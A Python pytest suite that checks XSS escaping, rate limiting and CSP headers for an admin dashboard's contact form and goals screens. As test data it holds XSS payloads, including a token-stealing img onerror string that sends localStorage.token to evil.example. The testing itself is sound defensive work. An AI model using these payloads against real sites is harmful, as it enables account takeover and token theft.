# -*- coding: utf-8 -*-
"""Regression tests for F-091 (stored XSS: public contact form ⇒ admin dashboard),
F-101 (no Content-Security-Policy) and the F-011 slice that makes the rate limit real.

Run:  cd backend && python3 -m pytest -q tests/test_xss_hardening.py

What must stay true:

  1. the public contact form still stores what the visitor typed, BYTE FOR BYTE — the defence
     is escaping at render, not mangling at write. A future "strip < and >" would quietly
     corrupt legitimate messages while everyone assumed the tags were the danger;
  2. the SHIPPED render functions (lifted verbatim out of dashboard-cloud/index.html and run
     in Node) emit `&lt;img`, never a live `<img>` and never an `on*` attribute — this is the
     exact harness that PROVED the bug, now asserting the opposite;
  3. the raw-concatenation patterns the gap report cited are gone from index.html and stay
     gone — a grep guard, because an escape can be dropped in a one-line edit and no unit
     test would notice;
  4. the contact form is rate-limited 5/hour/IP, keyed on an IP the CLIENT CANNOT PICK:
     the rightmost X-Forwarded-For entry (the one the proxy appended). Six posts that vary
     only the forged LEFT entries must still trip the limit;
  5. the CSP header ships even though IS_PRODUCTION is False — the deployed container runs
     with it False (F-021), so anything behind that flag never reaches a browser.
"""
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from html.parser import HTMLParser

import pytest

import app as appmod  # noqa: E402
from app import app as flask_app, db, Message  # noqa: E402

DASHBOARD_HTML = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
    'dashboard-cloud', 'index.html',
)

# The payload from the gap report — a tag that fires with no user interaction at all.
PAYLOAD = '<img src=x onerror=alert(1)>'
TOKEN_STEALER = '<img src=x onerror="fetch(\'https://evil.example/?t=\'+localStorage.token)">'


@pytest.fixture
def client():
    with flask_app.app_context():
        db.create_all()
    appmod._RATE_BUCKETS.clear()
    yield flask_app.test_client()
    appmod._RATE_BUCKETS.clear()


# ------------------------------------------------------------------ (a) stored verbatim

def test_contact_form_stores_every_field_verbatim(client):
    """The server does not sanitize, and must not start to: the browser escapes at render.
    Pin byte-for-byte storage so nobody 'fixes' this by mutating the visitor's words."""
    r = client.post('/api/messages', json={
        'name': TOKEN_STEALER,
        'email': 'attacker@example.com',
        'phone': PAYLOAD,
        'topic': PAYLOAD,
        'body': '<svg onload=alert(document.domain)>',
    }, environ_overrides={'HTTP_X_FORWARDED_FOR': '10.9.9.9'})
    assert r.status_code == 200, r.data
    assert r.get_json() == {'ok': True}

    with flask_app.app_context():
        m = Message.query.order_by(Message.id.desc()).first()
        assert m.name == TOKEN_STEALER
        assert m.phone == PAYLOAD
        assert m.topic == PAYLOAD
        assert m.body == '<svg onload=alert(document.domain)>'
        stored = appmod.serialize_message(m)
    assert stored['name'] == TOKEN_STEALER
    assert stored['body'] == '<svg onload=alert(document.domain)>'


# ------------------------------------------------------------------ (b) the real renderers

def _extract_function(src, name):
    """Lift `function <name>(...) { ... }` out of index.html verbatim, brace-matched and
    string-aware (so a brace inside a quoted HTML chunk cannot end the function early)."""
    start = src.index('function %s(' % name)
    i = src.index('{', start)
    depth, quote, esc_next = 0, None, False
    while i < len(src):
        c = src[i]
        if esc_next:
            esc_next = False
        elif quote:
            if c == '\\':
                esc_next = True
            elif c == quote:
                quote = None
        elif c in '\'"`':
            quote = c
        elif c == '{':
            depth += 1
        elif c == '}':
            depth -= 1
            if depth == 0:
                return src[start:i + 1]
        i += 1
    raise AssertionError('unterminated function %s' % name)


def _line_containing(src, needle):
    for line in src.split('\n'):
        if needle in line:
            return line
    raise AssertionError('line not found: %r' % needle)


class _TagCollector(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tags = []
        self.attrs = []

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        self.attrs.extend(a for a, _ in attrs)

    handle_startendtag = handle_starttag


@pytest.mark.skipif(shutil.which('node') is None, reason='node is required to run the shipped renderers')
def test_shipped_message_renderers_escape_the_payload():
    """Runs `esc`, `renderMsgs` and `drawMsg` EXACTLY as they ship in index.html — the same
    extraction the gap report used to fire the payload — and asserts nothing executes now."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    # `esc` is one line and its body holds a regex literal containing quote chars, so it is
    # lifted whole rather than brace-matched; the two renderers are brace-matched.
    fns = '\n'.join([_line_containing(src, 'function esc(s){')]
                    + [_extract_function(src, n) for n in ('renderMsgs', 'drawMsg')])
    trainer_row_tpl = _line_containing(src, '<div class="parties">${esc(t.name)}</div>')

    harness = r"""
// ---- minimal DOM + the globals the two functions close over ----
var msgFilter = 'all', selected = null;
var NODES = {};
function mkEl() {
  return { innerHTML: '', textContent: '',
           insertAdjacentHTML: function (pos, h) { this.innerHTML += h; },
           querySelectorAll: function () { return []; } };
}
globalThis.document = { getElementById: function (id) { return (NODES[id] = NODES[id] || mkEl()); } };
function svg() { return '<span class="i"></span>'; }
function timeAgo() { return 'الآن'; }

__FNS__

var PAYLOAD = __PAYLOAD__;
var msgs = [{ id: 1, name: PAYLOAD.stealer, email: PAYLOAD.plain, phone: PAYLOAD.plain,
              topic: PAYLOAD.plain, body: PAYLOAD.body, status: 'new', at: 1 }];
renderMsgs(msgs);          // list rows — drawn on screen open, no click
selected = 0;
drawMsg(msgs);             // the drawer

// the trainer-application row, evaluated from its shipped source line
var t = { name: PAYLOAD.stealer, spec: PAYLOAD.plain, ref: PAYLOAD.plain };
var trainerRow = eval('`' + __TRAINER_TPL__ + '`');

console.log(JSON.stringify({
  rows: NODES['msgRows'].innerHTML,
  drawer: NODES['drawer'].innerHTML,
  trainer: trainerRow
}));
"""
    harness = (harness
               .replace('__FNS__', fns)
               .replace('__PAYLOAD__', json.dumps({'plain': PAYLOAD, 'stealer': TOKEN_STEALER,
                                                   'body': '<svg onload=alert(1)>'}))
               .replace('__TRAINER_TPL__', json.dumps(trainer_row_tpl)))

    tmp = os.path.join(tempfile.mkdtemp(), 'render.js')
    with open(tmp, 'w', encoding='utf-8') as fh:
        fh.write(harness)
    proc = subprocess.run([shutil.which('node'), tmp], capture_output=True, text=True)
    assert proc.returncode == 0, proc.stderr
    out = json.loads(proc.stdout)

    for where, html in out.items():
        assert html, 'no output from %s' % where
        # the payload survives as TEXT, escaped
        assert '&lt;img' in html or '&lt;svg' in html, (where, html[:400])
        # ...and never as markup
        assert '<img' not in html.lower(), (where, html[:400])
        assert '<svg onload' not in html.lower(), (where, html[:400])
        p = _TagCollector()
        p.feed(html)
        assert 'img' not in p.tags, (where, p.tags)
        assert 'script' not in p.tags, (where, p.tags)
        on_attrs = [a for a in p.attrs if a.lower().startswith('on')]
        assert on_attrs == [], (where, on_attrs)

    # the drawer specifically: the message body, the field that carries 5000 free chars
    assert '&lt;svg onload=alert(1)&gt;' in out['drawer']


# --- dashboard-r3: the goals screen, driven by the advisor's own JSON ----------------

# The reviewer's payloads. `title` carries no tag at all — it only needs to close the
# value="..." attribute it is pasted into, which is why an "is there an <img>?" check
# alone would have missed it.
GOAL_PAYLOAD = {
    'title': '" autofocus onfocus=alert(1) x="',
    'cat': '"><img src=x onerror=alert(1)>',
    'owner': '"><img src=w onerror=alert(4)>',
    'unit': '<svg onload=alert(2)>',
    'due': '<img src=y onerror=alert(3)>',
    'rationale': '<img src=z onerror=fetch(1)>',
}


class _AttrCollector(HTMLParser):
    """Like _TagCollector, but keeps the whole attribute dict per tag: an attribute-context
    break shows up as an EXTRA attribute on an otherwise innocent <input>, not as a new tag."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tags = []
        self.attrs = []          # every attribute NAME seen anywhere
        self.elements = []       # (tag, {name: value})

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        self.attrs.extend(a for a, _ in attrs)
        self.elements.append((tag, dict(attrs)))

    handle_startendtag = handle_starttag


@pytest.mark.skipif(shutil.which('node') is None, reason='node is required to run the shipped renderers')
def test_shipped_goal_renderers_escape_the_advisor_payload():
    """`A.suggested` is LLM-authored JSON echoed straight out of /api/ai/goals-advisor, and
    it reaches THREE sinks: the advisor card (renderGoalsAdvisor), the prefilled form the
    «تبنّي» button opens (goalModal), and the targets list once adopted (renderGoals).
    All three are lifted verbatim out of index.html and run here."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    fns = '\n'.join([_line_containing(src, 'function esc(s){')]
                    + [_extract_function(src, n)
                       for n in ('renderGoalsAdvisor', 'renderGoals', 'goalModal')])

    harness = r"""
var NODES = {};
function mkEl() {
  return { innerHTML: '',
           insertAdjacentHTML: function (pos, h) { this.innerHTML += h; },
           querySelectorAll: function () { return []; } };
}
globalThis.document = { getElementById: function (id) { return (NODES[id] = NODES[id] || mkEl()); } };
function svg() { return '<span class="i"></span>'; }
function money(n) { return String(n); }
var GSTAT = { on:  { cls: 'ok',   t: 'على المسار' },
              behind: { cls: 'warn', t: 'متأخّر' },
              done: { cls: 'done', t: 'مكتمل' } };

__FNS__

var P = __PAYLOAD__;

// 1) the advisor card, straight off the wire
var ADV = { headline: P.title,
            insights: [P.cat],
            suggested: [{ title: P.title, cat: P.cat, owner: P.owner, unit: P.unit,
                          due: P.due, rationale: P.rationale, target: 5 }] };
globalThis.window = { EP: { ensure: function () {},
                            state: { goalsAdvisor: 'ok' },
                            data: { goalsAdvisor: ADV } } };
globalThis.EP = window.EP;
renderGoalsAdvisor();

// 2) the adopted goal — exactly what goalModalFrom() pushes onto GOALS
var GOALS = [{ title: P.title, cat: P.cat, owner: P.owner, current: 1, target: 5,
               unit: P.unit, due: P.due, status: 'on' }];
function tgGoals() { return GOALS; }
renderGoals(false);

// 3) the prefilled edit form the «تبنّي» button opens
var modalBody = '';
function openModal(t, body) {
  modalBody = body;
  return { querySelector: function () { return { onclick: null, value: '', dataset: {} }; } };
}
function closeModal() {} function viewTargets() {} function notify() {} function toast() {}
goalModal(0);

console.log(JSON.stringify({ advisor: NODES['goalsAdvisor'].innerHTML,
                             rows: NODES['goalRows'].innerHTML,
                             modal: modalBody }));
"""
    harness = harness.replace('__FNS__', fns).replace('__PAYLOAD__', json.dumps(GOAL_PAYLOAD))
    tmp = os.path.join(tempfile.mkdtemp(), 'goals.js')
    with open(tmp, 'w', encoding='utf-8') as fh:
        fh.write(harness)
    proc = subprocess.run([shutil.which('node'), tmp], capture_output=True, text=True)
    assert proc.returncode == 0, proc.stderr
    out = json.loads(proc.stdout)

    for where, html in out.items():
        assert html, 'no output from %s' % where
        # the payloads survive as TEXT...
        assert '&lt;' in html or '&quot;' in html, (where, html[:400])
        # ...and never as markup
        assert '<img' not in html.lower(), (where, html[:400])
        assert '<svg onload' not in html.lower(), (where, html[:400])
        p = _AttrCollector()
        p.feed(html)
        assert 'img' not in p.tags, (where, p.tags)
        assert 'svg' not in p.tags, (where, p.tags)
        assert 'script' not in p.tags, (where, p.tags)
        on_attrs = [a for a in p.attrs if a.lower().startswith('on')]
        assert on_attrs == [], (where, on_attrs, html[:400])
        assert 'autofocus' not in p.attrs, (where, p.attrs)

    # the modal specifically: every prefilled input still carries the payload as ONE
    # intact value="..." — escaped, not truncated at the quote and not mangled.
    p = _AttrCollector()
    p.feed(out['modal'])
    inputs = {a.get('id'): a for tag, a in p.elements if tag == 'input'}
    assert set(inputs) >= {'g_t', 'g_c', 'g_o', 'g_u', 'g_d'}, sorted(inputs)
    assert inputs['g_t']['value'] == GOAL_PAYLOAD['title'], inputs['g_t']
    assert inputs['g_c']['value'] == GOAL_PAYLOAD['cat'], inputs['g_c']
    assert inputs['g_o']['value'] == GOAL_PAYLOAD['owner'], inputs['g_o']
    assert inputs['g_u']['value'] == GOAL_PAYLOAD['unit'], inputs['g_u']
    assert inputs['g_d']['value'] == GOAL_PAYLOAD['due'], inputs['g_d']
    # the title payload's only job was to break out of the attribute — prove it did not
    assert set(inputs['g_t']) == {'id', 'value', 'placeholder'}, inputs['g_t']
    # the advisor card still shows the rationale, escaped
    assert '&lt;img src=z onerror=fetch(1)&gt;' in out['advisor']
    # ...and the adopted row still shows unit and due, escaped
    assert '&lt;svg onload=alert(2)&gt;' in out['rows']
    assert '&lt;img src=y onerror=alert(3)&gt;' in out['rows']


# ------------------------------------------------------------------ (c) grep guard

RAW_SINKS = [
    # F-091 — messages screen (gap report lines 5403, 5412, 5414, 5415, 5416)
    "'+m.name+'</div>", "'+m.topic+'", "'+m.email+'", "'+m.body+'", "'+(m.phone||'—')+'",
    # F-093 — trainer/program applications (1533, 1611, 1613, 1614, 1616, 1618, 1619)
    '${t.name}', '${t.spec}', '${t.ref}',
    '${p.title}', '${p.by}', '${p.ref}',
    '${tr.name}', '${tr.spec}', '${tr.ref}',
    # gap F-XSS-3 — openModal pastes its title (1965)
    '<span>${title}</span>',
    # gap F-XSS-4 — <option value> built from a platform user name (3410, and 2141)
    "'<option value=\"'+u.name+'\">", "'+u.email+'</option>",
    # gap F-XSS-6 / ledger F-114 — LLM-authored headline pasted as HTML (3739)
    "'+A.headline+'",
    # dashboard-minors — goals advisor: LLM-authored insight text and suggested-goal
    # title pasted as HTML (renderGoalsAdvisor, ~3750/3764)
    "'+t+'</div></div>", "color:var(--ink)\">'+title+'</div>",
    # dashboard-minors review round — same suggested-goal object, four sibling fields
    # (unit/due/rationale/cat) pasted raw into the same meta line and category badge
    "g.unit?' '+g.unit:''", "'الموعد '+g.due)", "meta.push(g.rationale)",
    "10.5px\">'+((g&&g.cat)||'مقترح')+'</span>'",
    # dashboard-r3 — the SAME untrusted A.suggested object reaches two more sinks the
    # advisor hands it to: goalModal() pastes five of its fields inside value="..."
    # attributes (a quote there escapes the attribute, no tag needed), and renderGoals()
    # paints the adopted goal back onto the targets screen as HTML.
    'id="g_t" value="\'+(e.title||\'\')+\'"',
    'id="g_c" value="\'+(e.cat||',
    'id="g_o" value="\'+(e.owner||',
    'id="g_u" value="\'+(e.unit||\'\')+\'"',
    'id="g_d" value="\'+(e.due||\'\')+\'"',
    "'+g.cat+'", "'+g.title+'", "'+g.owner+'", "'+g.due+'", "'+g.unit+'",
    # prelaunch B7 — the sinks F-093's fix left behind, one class each. The renderers
    # themselves are exercised in tests/test_xss_sinks_round2.py; these are the grep half.
    # F-135 course drawer (employee-writable via POST /api/courses):
    '${c.title}', '${c.inst}', '${c.enrolled}', '${c.from}',
    # F-142 price offers (platform bridge + an LLM-authored segment label):
    '${o.course}', '${o.buyer}', '${SEG_LABEL[o.segment]||o.segment}', '${o.currency}',
    # F-144 escrow (written by the BRIDGE SECRET, not by the admin):
    '${e.student}', '${e.expert}', '${e.release}', '${d.reason}', '${d.party}',
    "${d.expert||''}", '${d.sla}', '${r.expert}',
    # F-146 targets screen (month label + the dead-today edit modal's value="…"):
    '${t.m}', 'value="\'+(e.m||\'\')+\'"',
]


def test_no_raw_concatenation_of_user_text_into_html():
    """A one-line edit can drop an esc() and no unit test would see it. This one does."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    offenders = {p: src.count(p) for p in RAW_SINKS if p in src}
    assert offenders == {}, offenders


def test_every_fixed_sink_is_actually_escaped_in_the_shipped_file():
    """The mirror of the guard above: prove the escaped form is what ships (the
    'written but never rendered' trap in reverse — never assert only an absence)."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    for needle in ("'+esc(m.name)+'", "'+esc(m.topic)+'", "'+esc(m.email)+'",
                   "'+esc(m.body)+'", "'+esc(m.phone||'—')+'",
                   '${esc(t.name)}', '${esc(t.spec)}', '${esc(t.ref)}',
                   '${esc(p.title)}', '${esc(p.by)}', '${esc(p.ref)}',
                   '${esc(tr.name)}', '${esc(tr.spec)}', '${esc(tr.ref)}',
                   '<span>${esc(title)}</span>',
                   "'<option value=\"'+esc(u.name)+'\">", "'+esc(A.headline)+'",
                   "'+esc(t)+'</div></div>", "color:var(--ink)\">'+esc(title)+'</div>",
                   "g.unit?' '+esc(g.unit):''", "'الموعد '+esc(g.due))",
                   "meta.push(esc(g.rationale))", "esc((g&&g.cat)||'مقترح')+'</span>'",
                   # dashboard-r3 — goalModal's five attribute sites...
                   'id="g_t" value="\'+esc(e.title||\'\')+\'"',
                   'id="g_c" value="\'+esc(e.cat||',
                   'id="g_o" value="\'+esc(e.owner||',
                   'id="g_u" value="\'+esc(e.unit||\'\')+\'"',
                   'id="g_d" value="\'+esc(e.due||\'\')+\'"',
                   # ...and renderGoals' five text sites (current/target stay numeric)
                   "'+esc(g.cat)+'", "'+esc(g.title)+'", "'+esc(g.owner)+'",
                   "'+esc(g.due)+'", "'+esc(g.unit)+'",
                   # prelaunch B7 — the escaped form of every sink added to RAW_SINKS above
                   '${esc(c.title)}', '${esc(c.inst)}', '${esc(c.enrolled)}', '${esc(c.from)}',
                   '${esc(o.course)}', '${esc(o.buyer)}', '${esc(o.currency)}',
                   '${SEG_LABEL[o.segment]||esc(o.segment)}',
                   '${esc(e.student)}', '${esc(e.expert)}', '${esc(e.release)}',
                   '${esc(d.reason)}', '${esc(d.party)}', "${esc(d.expert||'')}",
                   '${esc(d.sla)}', '${esc(r.expert)}',
                   '${esc(t.m)}', 'value="\'+esc(e.m||\'\')+\'"'):
        assert needle in src, needle


def test_goal_modal_from_never_escapes_so_saving_cannot_double_escape():
    """dashboard-r3: goalModalFrom() copies the advisor's suggestion into the GOALS array,
    and goalModal() escapes it on the way into the input. Escaping HERE too would put
    `&lt;` into the field, and the save handler would then persist that literal text as
    the goal's title — the mirror-image bug of the one being fixed."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    body = _extract_function(src, 'goalModalFrom')
    assert 'esc(' not in body, body


def test_open_modal_title_is_escaped_exactly_once():
    """openModal() escapes its own title now, so no caller may escape it again — a
    double-escaped title renders '&amp;' instead of '&'."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    assert 'openModal(esc(' not in src
    assert "+esc(c.title)," not in src
    assert "+esc(k.title)," not in src


# ------------------------------------------------------------------ (d) rate limit + client IP

def test_client_ip_takes_the_rightmost_forwarded_entry():
    with flask_app.test_request_context(
            '/', environ_overrides={'HTTP_X_FORWARDED_FOR': '1.1.1.1, 2.2.2.2, 203.0.113.7',
                                    'REMOTE_ADDR': '127.0.0.1'}):
        assert appmod._client_ip() == '203.0.113.7'


def test_client_ip_ignores_a_forged_cf_header_unless_the_proxy_layer_is_trusted(monkeypatch):
    """dashboard.elprofessor.net is not behind Cloudflare (live response: `server: gunicorn`,
    no cf-ray), so CF-Connecting-IP is 100% client-authored."""
    over = {'HTTP_CF_CONNECTING_IP': '9.9.9.9',
            'HTTP_X_FORWARDED_FOR': '1.1.1.1, 203.0.113.7',
            'REMOTE_ADDR': '127.0.0.1'}
    monkeypatch.delenv('TRUST_CF_HEADERS', raising=False)
    with flask_app.test_request_context('/', environ_overrides=over):
        assert appmod._client_ip() == '203.0.113.7'
    monkeypatch.setenv('TRUST_CF_HEADERS', '1')
    with flask_app.test_request_context('/', environ_overrides=over):
        assert appmod._client_ip() == '9.9.9.9'


def test_client_ip_falls_back_to_the_socket_peer():
    with flask_app.test_request_context('/', environ_overrides={'REMOTE_ADDR': '198.51.100.4'}):
        assert appmod._client_ip() == '198.51.100.4'


def test_contact_form_is_rate_limited_per_real_ip_not_per_forged_header(client):
    """Six posts whose ONLY difference is the forged LEFT entries of X-Forwarded-For. The
    proxy-appended rightmost entry is identical, so the sixth must be refused."""
    codes = []
    for i in range(6):
        r = client.post('/api/messages', json={
            'name': 'زائر %d' % i, 'email': 'v%d@example.com' % i, 'body': 'استفسار قصير',
        }, environ_overrides={
            # a new forged left-hand value on every request — the old _client_ip() minted a
            # fresh bucket key for each of these and never limited anything
            'HTTP_X_FORWARDED_FOR': '10.0.0.%d, 172.16.0.%d, 203.0.113.99' % (i, i),
        })
        codes.append(r.status_code)
    assert codes[:5] == [200] * 5, codes
    assert codes[5] == 429, codes
    body = json.loads(client.post('/api/messages', json={
        'name': 'زائر', 'email': 'v@example.com', 'body': 'استفسار'},
        environ_overrides={'HTTP_X_FORWARDED_FOR': '8.8.8.8, 203.0.113.99'}).data)
    assert body['error'] == 'وصلتَ الحدّ المسموح لإرسال الرسائل — من فضلك حاول بعد ساعة'
    # ...and a genuinely different client is untouched
    r = client.post('/api/messages', json={
        'name': 'زائر آخر', 'email': 'other@example.com', 'body': 'استفسار'},
        environ_overrides={'HTTP_X_FORWARDED_FOR': '203.0.113.100'})
    assert r.status_code == 200


def test_rate_limit_counts_honeypot_submissions_too(client):
    """The honeypot returns a fake 200; without counting it a bot gets a free unlimited lane."""
    for _ in range(5):
        client.post('/api/messages', json={'website': 'x', 'name': 'b', 'email': 'b@b.co', 'body': 'b'},
                    environ_overrides={'HTTP_X_FORWARDED_FOR': '203.0.113.55'})
    r = client.post('/api/messages', json={'name': 'زائر', 'email': 'v@example.com', 'body': 'استفسار'},
                    environ_overrides={'HTTP_X_FORWARDED_FOR': '203.0.113.55'})
    assert r.status_code == 429


def test_invalid_submissions_do_not_burn_the_rate_limit_quota(client):
    """dashboard-minors: the rate limit runs AFTER basic validation now — five honest typos
    (missing fields / a malformed email / an over-long body) must all come back 400 and leave
    the hour quota untouched, so the visitor's sixth attempt, once fixed, still goes through."""
    ip = {'HTTP_X_FORWARDED_FOR': '203.0.113.77'}
    bad_payloads = [
        {},  # missing everything
        {'name': 'زائر', 'email': '', 'body': 'رسالة'},  # missing email
        {'name': 'زائر', 'email': 'not-an-email', 'body': 'رسالة'},  # no '@'
        {'name': 'زائر', 'email': 'v@example.com', 'body': ''},  # missing body
        {'name': 'زائر', 'email': 'v@example.com', 'body': 'x' * 5001},  # over length cap
    ]
    for payload in bad_payloads:
        r = client.post('/api/messages', json=payload, environ_overrides=ip)
        assert r.status_code == 400, (payload, r.status_code)
    # none of the five above touched the bucket — a valid submission right after still succeeds
    r = client.post('/api/messages', json={
        'name': 'زائر', 'email': 'v@example.com', 'body': 'استفسار صحيح',
    }, environ_overrides=ip)
    assert r.status_code == 200, r.get_json()


def test_invalid_payloads_are_still_capped_by_a_loose_per_call_bucket(client):
    """dashboard-minors review round: moving the strict 5/hour bucket AFTER validation opened
    an unlimited lane for pure garbage (payloads that never reach that check). A second,
    looser bucket (60/hour) is checked before anything else — honeypot included — on every
    call regardless of validity, so this route still has a ceiling."""
    ip = {'HTTP_X_FORWARDED_FOR': '203.0.113.81'}
    for _ in range(60):
        r = client.post('/api/messages', json={}, environ_overrides=ip)
        assert r.status_code == 400, r.get_json()
    r = client.post('/api/messages', json={}, environ_overrides=ip)
    assert r.status_code == 429, r.get_json()
    assert r.get_json()['error'] == 'وصلتَ الحدّ المسموح لإرسال الرسائل — من فضلك حاول بعد ساعة'
    # a genuinely different client is untouched
    r2 = client.post('/api/messages', json={},
                      environ_overrides={'HTTP_X_FORWARDED_FOR': '203.0.113.82'})
    assert r2.status_code == 400


def test_the_rate_limit_still_blocks_after_five_valid_submissions(client):
    """The reorder must not accidentally disable the limit for honest, valid traffic."""
    ip = {'HTTP_X_FORWARDED_FOR': '203.0.113.78'}
    for i in range(5):
        r = client.post('/api/messages', json={
            'name': 'زائر %d' % i, 'email': 'v%d@example.com' % i, 'body': 'استفسار',
        }, environ_overrides=ip)
        assert r.status_code == 200, r.get_json()
    r = client.post('/api/messages', json={
        'name': 'زائر', 'email': 'v@example.com', 'body': 'استفسار',
    }, environ_overrides=ip)
    assert r.status_code == 429


def test_honeypot_hit_skips_validation_and_still_pretends_success(client):
    """The honeypot is checked before validation, so even a bot payload missing name/email/body
    gets the same fake 200 — never a 400 that would tip off a bot that the trap exists."""
    with flask_app.app_context():
        before = Message.query.count()
    r = client.post('/api/messages', json={'website': 'x'},
                     environ_overrides={'HTTP_X_FORWARDED_FOR': '203.0.113.79'})
    assert r.status_code == 200
    assert r.get_json() == {'ok': True}
    with flask_app.app_context():
        assert Message.query.count() == before      # nothing stored — the whole suite's db is shared


# ------------------------------------------------------------------ (e) CSP

EXPECTED_CSP_DIRECTIVES = [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com data:",
    "img-src 'self' data:",
    "connect-src 'self'",
    "object-src 'none'",
    "base-uri 'none'",
    # F-141 — measured inside Chromium (AUDIT/tools/csp_exfil_probe.py): without this a
    # top-level POST built by injected code walks the admin JWT out past connect-src.
    "form-action 'self'",
    "frame-ancestors 'none'",
]


def test_csp_ships_even_when_is_production_is_false(client):
    """F-021: the deployed container runs with IS_PRODUCTION False. A CSP behind that flag
    would never reach a single browser, which is why this one is outside it."""
    assert appmod.IS_PRODUCTION is False, 'this test must run in the non-production config'
    r = client.get('/api/messages')          # 401, but the after_request headers still apply
    csp = r.headers.get('Content-Security-Policy')
    assert csp, 'no Content-Security-Policy header'
    for d in EXPECTED_CSP_DIRECTIVES:
        assert d in csp, (d, csp)
    # CHANGED (prelaunch B7 / F-021): this used to assert HSTS is ABSENT here, as proof the
    # CSP sits outside the IS_PRODUCTION branch. That assertion pinned the bug: the deployed
    # container also runs with IS_PRODUCTION False, so production-only meant nowhere. HSTS is
    # now unconditional (a UA must ignore it on a non-secure connection, RFC 6797 §7.2), and
    # its presence here IS the proof that the live https host finally receives it.
    assert r.headers.get('Strict-Transport-Security') == 'max-age=31536000; includeSubDomains'


def test_csp_is_on_the_html_entrypoint_too(client):
    r = client.get('/')
    assert r.headers.get('Content-Security-Policy'), r.headers


def test_csp_allows_everything_the_dashboard_actually_loads():
    """Verified by inventory, not by hope: the page's only cross-origin asset is the Google
    Fonts @import. Any new external <script>/<img>/<iframe>/fetch host must extend the CSP
    in the same commit, or it silently fails to load with no error anywhere."""
    base = os.path.dirname(DASHBOARD_HTML)
    blob = ''
    for f in ('index.html', 'dashboard-api.js', 'site-content.js'):
        blob += open(os.path.join(base, f), encoding='utf-8').read()
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    assert re.search(r'<script\s+src=["\'](?!site-content\.js|dashboard-api\.js)', src) is None
    assert '<iframe' not in src.lower()
    assert re.search(r'<img\b', src, re.I) is None
    # exactly one network origin for XHR/fetch: same-origin /api
    fetches = re.findall(r'fetch\(\s*([^,\)]+)', blob)
    assert fetches == ['API_BASE + path'], fetches
    # the one and only cross-origin asset the page LOADS (everything else that looks like a
    # URL in this file is an <input placeholder> or an href the browser only navigates to)
    imports = set(re.findall(r"@import\s+url\(['\"]https://([a-z0-9.\-]+)", src))
    assert imports == {'fonts.googleapis.com'}, imports
